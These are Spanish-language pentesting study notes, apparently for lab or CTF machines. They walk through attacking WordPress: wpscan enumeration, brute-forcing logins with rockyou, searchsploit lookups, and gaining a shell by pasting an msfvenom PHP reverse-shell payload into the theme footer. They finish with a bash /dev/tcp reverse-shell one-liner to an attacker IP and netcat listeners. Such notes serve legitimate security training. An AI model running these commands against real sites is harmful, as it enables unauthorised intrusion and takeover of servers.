**Comenzamos con la explotación y enumeración de WordPress, donde veremos las rutas más importantes que debemos acceder para comprobar la existencia de vulnerabilidades, así como acceder al panel de login de una web hecha en WordPress.**

Con el nombre de dominio, tendremos que editar el fichero `/etc/hosts` y añadirlo junto con la IP de la maquina victima en caso de que no nos cargue bien la maquina

En WordPress hay una ruta muy típica llamada `wp-login` si no carga añadir .php `wp-login.php` y accederemos al panel de login de WordPress.


### ENUMERACION USUARIOS Y PLUGINS

Deberemos usar una herramienta llamada [[WPSCAN]] 
`wpscan --url http://<Ip_Victima>/blog --enumerate u,vp`
*Este comando nos permite hacer una búsqueda exhaustiva de usuarios y plugins, muy importante no añadir a la ruta el `/wp-loging.php` *


### FUERZA BRUTA

Utilizaremos [[WPSCAN]]
`wpscan -U <User_Encontrado> --url http://<Ip_Victima>/<Directorio> -P /usr/share/wordlists/rockyou.txt` 


### EXPLOTACION PLUGINS

Después de la enumeración con [[WPSCAN]] con los plugins encontrados para ver si son vulnerables usaremos [[SEARCHSPLOIT]] para buscarlo
`searchsploit wordpress <Plugin_name>`

Una vez hemos visto un exploit que nos interese usaremos [[SEARCHSPLOIT]] para importarlo a local
`searchsploit -m <Plugin_Id>`

Cuando ya lo tenemos solo habría que explotarlo siguiendo los pasos dependiendo de cada tipo de exploit


### INYECCION CODIGO

En caso de que podamos subir archivos lo podríamos hacer con [[00. Apuntes/01. Herramientas/MSFVENOM|MSFVENOM]] pero en caso de no poder hacerlo tendríamos que editar uno ya existente.
1. ¿Hay un apartado que ponga file upload?
	Si lo hay usaremos [[00. Apuntes/01. Herramientas/MSFVENOM|MSFVENOM]] 

2. No hay este apartado
	1. Ir al apartado Apperance 
	2. Theme Editor
	3. Buscamos la plantilla Theme Footer
	4. Añadiremos el contenido de un Payload que creemos con [[00. Apuntes/01. Herramientas/MSFVENOM|MSFVENOM]]
	5. Crear el Payload con [[00. Apuntes/01. Herramientas/MSFVENOM|MSFVENOM]] para poder copiar su contenido
		`msfvenom -p php/reverse_php LHOST=10.9.3.213 LPORT=444 raw > pawned.php`
	6. Copiamos el contenido del Payload creado en el WordPress 
	7. Damos a Update File
	8. Nos ponemos a escuchar en [[NETCAT]] `nc -lvnp 444 `
	9. Vamos a la ruta principal del WordPress 
	10. Y obtendremos la conexión
	11. Saneamos la Shell con los siguientes pasos
	12. Preparamos en un navegador la web de `www.revshells.com` con el puerto de escucha 445
	13. En otra ventana de terminal nos ponemos en escucha con [[NETCAT]] en otro puerto `nc -lvnp 445`
	14. En el [[NETCAT]] que tenemos en contacto con WordPress ponemos `bash -c "sh -i >& /dev/tcp/10.9.3.213/445 0>&1"`
	15. Y en el [[NETCAT]] que tenemos escuchando en ese puerto tendremos una nueva shell
